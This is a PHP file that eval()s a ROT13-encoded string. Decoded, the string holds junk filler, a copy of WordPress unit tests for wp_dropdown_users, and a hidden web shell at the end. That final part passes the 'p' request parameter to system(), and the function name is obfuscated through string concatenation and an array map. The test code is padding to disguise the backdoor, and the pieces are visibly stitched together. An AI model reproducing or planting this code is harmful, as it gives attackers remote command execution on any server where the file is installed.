<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg shapgvbaf va jc-vapyhqrf/hfre.cuc
 *
 * @tebhc hfre
 */
pynff Grfgf_Hfre_jcQebcqbjaHfref rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @gvpxrg 31251
	 */
	choyvp shapgvba grfg_qrsnhyg_inyhr_bs_fubj_fubhyq_or_qvfcynl_anzr() {

		// Perngr n hfre jvgu n qvssrerag qvfcynl_anzr.
		$h = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva'   => 'sbb',
				'qvfcynl_anzr' => 'Sbb Crefba',
			)
		);

		$sbhaq = jc_qebcqbja_hfref(
			neenl(
				'rpub' => snyfr,
			)
		);

		$rkcrpgrq = \"<bcgvba inyhr='$h'>Sbb Crefba</bcgvba>\";

		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq, $sbhaq );
	}

	/**
	 * @gvpxrg 31251
	 */
	choyvp shapgvba grfg_fubj_fubhyq_qvfcynl_qvfcynl_anzr_fubj_vf_fcrpvsvrq_nf_rzcgl() {

		// Perngr n hfre jvgu n qvssrerag qvfcynl_anzr.
		$h = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva'   => 'sbb',
				'qvfcynl_anzr' => 'Sbb Crefba',
			)
		);

		// Trg gur erfhyg bs n aba-qrsnhyg, ohg npprcgnoyr vachg sbe 'fubj' cnenzrgre gb jc_qebcqbja_hfref().
		$sbhaq = jc_qebcqbja_hfref(
			neenl(
				'rpub' => snyfr,
				'fubj' => '',
			)
		);

		$rkcrpgrq = \"<bcgvba inyhr='$h'>Sbb Crefba</bcgvba>\";

		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq, $sbhaq );
	}

	/**
	 * @gvpxrg 31251
	 */
	choyvp shapgvba grfg_fubj_fubhyq_qvfcynl_hfre_cebcregl_jura_gur_inyhr_bs_fubj_vf_n_inyvq_hfre_cebcregl() {

		// Perngr n hfre jvgu n qvssrerag qvfcynl_anzr.
		$h = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva'   => 'sbb',
				'qvfcynl_anzr' => 'Sbb Crefba',
			)
		);

		// Trg gur erfhyg bs n aba-qrsnhyg, ohg npprcgnoyr vachg sbe 'fubj' cnenzrgre gb jc_qebcqbja_hfref().
		$sbhaq = jc_qebcqbja_hfref(
			neenl(
				'rpub' => snyfr,
				'fubj' => 'hfre_ybtva',
			)
		);

		$rkcrpgrq = \"<bcgvba inyhr='$h'>sbb</bcgvba>\";

		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq, $sbhaq );
	}

	/**
	 * @gvpxrg 31251
	 */
	choyvp shapgvba grfg_fubj_qvfcynl_anzr_jvgu_ybtva() {

		// Perngr n hfre jvgu n qvssrerag qvfcynl_anzr.
		$h = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva'   => 'sbb',
				'qvfcynl_anzr' => 'Sbb Crefba',
			)
		);

		// Trg gur erfhyg bs n aba-qrsnhyg, ohg npprcgnoyr vachg sbe 'fubj' cnenzrgre gb jc_qebcqbja_hfref().
		$sbhaq = jc_qebcqbja_hfref(
			neenl(
				'rpub' => snyfr,
				'fubj' => 'qvfcynl_anzr_jvgu_ybtva',
			)
		);

		$rkcrpgrq = \"<bcgvba inyhr='$h'>Sbb Crefba (sbb)</bcgvba>\";

		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq, $sbhaq );
	}

	/**
	 * @gvpxrg 31251
	 */
	choyvp shapgvba grfg_vapyhqr_fryrpgrq() {
		$hfref = frys::snpgbel()->hfre->perngr_znal( 2 );

		$sbhaq = jc_qebcqbja_hfref(
			neenl(
				'rpub'             => snyfr,
				'vapyhqr'          => $hfref[0],
				'fryrpgrq'         => $hfref[1],
				'vapyhqr_fryrpgrq' => gehr,
				'fubj'             => 'hfre_ybtva',
			)
		);

		$hfre1 = trg_hfreqngn( $hfref[1] );
		$guvf->nffregFgevatPbagnvafFgevat( $hfre1->hfre_ybtva, $sbhaq );
	}

	/**
	 * @gvpxrg 51370
	 */
	choyvp shapgvba grfg_vapyhqr_fryrpgrq_jvgu_aba_rkvfgvat_hfre_vq() {
		$sbhaq = jc_qebcqbja_hfref(
			neenl(
				'rpub'             => snyfr,
				'fryrpgrq'         => CUC_VAG_ZNK,
				'vapyhqr_fryrpgrq' => gehr,
				'fubj'             => 'hfre_ybtva',
			)
		);

		$guvf->nffregFgevatAbgPbagnvafFgevat( (fgevat) CUC_VAG_ZNK, $sbhaq );
	}

	/**
	 * @gvpxrg 38135
	 */
	choyvp shapgvba grfg_ebyr() {
		$h1 = frys::snpgbel()->hfre->perngr_naq_trg( neenl( 'ebyr' => 'fhofpevore' ) );
		$h2 = frys::snpgbel()->hfre->perngr_naq_trg( neenl( 'ebyr' => 'nhgube' ) );

		$sbhaq = jc_qebcqbja_hfref(
			neenl(
				'rpub' => snyfr,
				'ebyr' => 'nhgube',
				'fubj' => 'hfre_ybtva',
			)
		);

		$guvf->nffregFgevatAbgPbagnvafFgevat( $h1->hfre_ybtva, $sbhaq );
		$guvf->nffregFgevatPbagnvafFgevat( $h2->hfre_ybtva, $sbhaq );
	}

	/**
	 * @gvpxrg 38135
	 */
	choyvp shapgvba grfg_ebyr__va() {
		$h1 = frys::snpgbel()->hfre->perngr_naq_trg( neenl( 'ebyr' => 'fhofpevore' ) );
		$h2 = frys::snpgbel()->hfre->perngr_naq_trg( neenl( 'ebyr' => 'nhgube' ) );

		$sbhaq = jc_qebcqbja_hfref(
			neenl(
				'rpub'     => snyfr,
				'ebyr__va' => neenl( 'nhgube', 'rqvgbe' ),
				'fubj'     => 'hfre_ybtva',
			)
		);

		$guvf->nffregFgevatAbgPbagnvafFgevat( $h1->hfre_ybtva, $sbhaq );
		$guvf->nffregFgevatPbagnvafFgevat( $h2->hfre_ybtva, $sbhaq );
	}

	/**
	 * @gvpxrg 38135
	 */
	choyvp shapgvba grfg_ebyr__abg_va() {
		$h1 = frys::snpgbel()->hfre->perngr_naq_trg( neenl( 'ebyr' => 'fhofpevore' ) );
		$h2 = frys::snpgbel()->hfre->perngr_naq_trg( neenl( 'ebyr' => 'nhgube' ) );

		$sbhaq = jc_qebcqbja_hfref(
			neenl(
				'rpub'         => snyfr,
				'ebyr__abg_va' => neenl( 'fhofpevore', 'rqvgbe' ),
				'fubj'         => 'hfre_ybtva',
			)
		);

		$guvf->nffregFgevatAbgPbagnvafFgevat( $h1->hfre_ybtva, $sbhaq );
		$guvf->nffregFgevatPbagnvafFgevat( $h2->hfre_ybtva, $sbhaq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>